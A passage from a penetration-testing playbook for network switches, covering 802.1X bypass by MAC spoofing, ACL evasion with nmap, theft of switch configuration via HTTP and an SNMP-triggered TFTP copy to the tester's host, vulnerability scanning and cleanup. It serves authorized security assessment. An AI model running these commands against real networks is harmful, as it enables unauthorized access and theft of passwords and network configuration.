# (Simply plug in and check if you get an IP)
ip addr show eth0
ping <GATEWAY_IP>

# If you get IP without any authentication prompt — no 802.1X

# Bypass 802.1X with MAC spoofing (if only MAC-based auth)
# First find an authorized MAC (from CDP/LLDP or passive sniff)
sudo macchanger -m <AUTHORIZED_MAC> eth0
sudo systemctl restart networking

# Check if you now get network access
dhclient eth0
ip addr show eth0
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| IP assigned without authentication | No 802.1X | 🔴 High |
| MAC spoof bypasses auth | Only MAC-based auth (weak) | 🔴 High |
| EAP challenge received | 802.1X enabled | 🟢 Secure |
| Port shuts down on MAC spoof | Port security + 802.1X | 🟢 Secure |

### 🔴 Risk: High — Unauthorized physical access = full network access

---

## TC-30 – ACL Bypass Test

### 🎯 Objective
Test whether Access Control Lists (ACLs) on the switch are correctly implemented and cannot be bypassed.

### Commands
```bash
# Map which ports/services are filtered vs allowed
nmap -sS -p- <IP> --reason -oN tc30_acl_test.txt

# Try accessing filtered ports from different source ports
nmap -sS -p <FILTERED_PORT> --source-port 53 <IP>
nmap -sS -p <FILTERED_PORT> --source-port 80 <IP>
nmap -sS -p <FILTERED_PORT> --source-port 443 <IP>
# Some ACLs trust traffic from port 53 (DNS) — bypass possible

# Try fragmented packets (may bypass stateless ACLs)
nmap -f -p <FILTERED_PORT> <IP>

# Try decoy scan
nmap -D RND:5 -p <FILTERED_PORT> <IP>
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| Filtered port becomes accessible via source port 53 | ACL bypass possible | 🔴 High |
| Fragmented packets bypass filter | Stateless ACL, no deep inspection | 🔴 High |
| All bypasses fail | ACL properly implemented | 🟢 Secure |

### 🔴 Risk: High — Filtered services become accessible

---

## TC-31 – Config Backup Exposure via HTTP/SNMP

### 🎯 Objective
Attempt to download the switch's configuration file via HTTP, SNMP, or other methods.

### Commands
```bash
# HTTP config download (some switches expose config via web)
curl http://<IP>/config.bin
curl http://<IP>/running-config
curl http://<IP>/backup.cfg
curl http://<IP>/cgi-bin/config

# SNMP config backup (Cisco specific)
# Uses CISCO-CONFIG-COPY-MIB to copy config to TFTP server
snmpset -v2c -c private <IP> \
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 4 \    # Source = running config
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 i 1 \    # Dest = TFTP
  1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 a <YOUR_IP> \   # TFTP server IP
  1.3.6.1.4.1.9.9.96.1.1.1.1.6.1 s "stolen-config.txt" \  # Filename
  1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1    # Trigger copy

# Set up TFTP server to receive:
sudo apt install tftpd-hpa -y
sudo systemctl start tftpd-hpa
ls /srv/tftp/stolen-config.txt   # Check if received
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| Config file downloaded via HTTP | Unauthenticated config access | 🔴 Critical |
| SNMP triggers TFTP backup | SNMP write + TFTP exposed | 🔴 Critical |
| Requests denied/unauthorized | Properly secured | 🟢 Secure |

### 🔴 Risk: Critical — Config contains all passwords, VLANs, ACLs, routing info

---

## TC-32 – Automated Vulnerability Scan

### 🎯 Objective
Run automated vulnerability scanners to catch known CVEs and misconfigurations.

### Using Nessus (Free for home use)
```bash
# If Nessus installed:
# 1. Open: https://localhost:8834
# 2. New Scan → Basic Network Scan
# 3. Add target IP(s)
# 4. Run and review results
```

### Using OpenVAS / Greenbone
```bash
# Install
sudo apt install openvas -y
sudo gvm-setup
sudo gvm-start

# Access at: https://localhost:9392
# Create target, run scan, export report
```

### Using Nmap Scripting Engine (NSE) — No Install Needed
```bash
# Run ALL vulnerability scripts
sudo nmap --script vuln <IP> -oN tc32_nmap_vuln.txt

# Specific CVE checks:
sudo nmap --script smb-vuln-ms17-010 -p 445 <IP>
sudo nmap --script ssl-heartbleed -p 443 <IP>
sudo nmap --script http-shellshock <IP>

# Cisco-specific scripts
sudo nmap --script cisco-* <IP>
```

### 🔴 Risk: Varies — Depends on CVEs found

---

## 📋 Post-Testing Cleanup

```bash
# Stop all running attacks
sudo pkill arpspoof
sudo pkill yersinia
sudo pkill macof
sudo pkill dnsmasq

# Restore IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Restore original MAC address
sudo macchanger -p eth0

# Flush modified ARP entries
sudo arp -d <GATEWAY_IP>
sudo arp -d <TARGET_IP>

# Archive all evidence
mkdir evidence_$(date +%Y%m%d_%H%M)
mv tc*.txt tc*.pcap tc*.csv tc*.cap evidence_$(date +%Y%m%d_%H%M)/
tar -czf switch_vapt_evidence_$(date +%Y%m%d).tar.gz evidence_*/
```

---

## 📊 Complete Risk Matrix

| TC | Test | Max Risk |
|----|------|----------|
| TC-01 | Host Discovery | ℹ️ Info |
| TC-02 | TCP Port Scan | 🟡 Medium |
| TC-03 | UDP Port Scan | 🟠 High |
| TC-04 | Service Enumeration | 🟠 High |
| TC-05 | SNMP Enumeration | 🔴 High |
| TC-06 | Telnet Access | 🔴 Critical |
| TC-07 | SSH Security | 🟠 Medium–High |
| TC-08 | Web Interface | 🔴 Critical |
| TC-09 | Default Credentials | 🔴 Critical |
| TC-10 | Management Exposure | 🟠 Medium |
| TC-11 | SMB | 🔴 High |
| TC-12 | SSL/TLS | 🟠 Medium–High |
| TC-13 | Banner Grabbing | 🟡 Low–Medium |
| TC-14 | Brute Force | 🔴 Critical |
| TC-15 | DoS Test | 🟠 High |
| TC-16 | SNMP Write Access | 🔴 Critical |
| TC-17 | CDP/LLDP Leakage | 🟠 Medium |
| TC-18 | STP Attack | 🔴 High |
| TC-19 | VLAN Hopping | 🔴 Critical |
| TC-20 | MAC Flooding | 🔴 High |
| TC-21 | ARP Spoofing | 🔴 High |
| TC-22 | DHCP Starvation/Rogue | 🔴 High |
| TC-23 | Routing Protocol (OSPF/BGP) | 🔴 Critical |
| TC-24 | NTP Security | 🟠 Medium |
| TC-25 | Syslog Exposure | 🟠 Medium |
| TC-26 | TFTP Config Theft | 🔴 Critical |
| TC-27 | IPv6 Misconfiguration | 🔴 High |
| TC-28 | ICMP Redirect | 🟠 Medium |
| TC-29 | Port Security / 802.1X | 🔴 High |
| TC-30 | ACL Bypass | 🔴 High |
| TC-31 | Config Backup Exposure | 🔴 Critical |
| TC-32 | Automated Vuln Scan | Varies |

---

## 🔖 Tips for the Day of Testing

1. Start with **TC-01 → TC-04** (passive/low-impact) before any active attacks.
2. **Save all outputs** — run `script session.log` at the start of your terminal.
3. **Confirm before disruptive tests** — TC-15 (DoS), TC-18 (STP), TC-20 (MAC flood), TC-22 (DHCP) can affect live users.
4. Run `tshark` or `tcpdump` passively first — CDP/LLDP/OSPF/STP frames reveal a lot before you send a single packet.
5. Document **exact commands run**, **timestamps**, and **raw output** for every test — your report is only as good as your evidence.

---

*All testing must be performed under written authorization. This document is for authorized security assessment use only.*
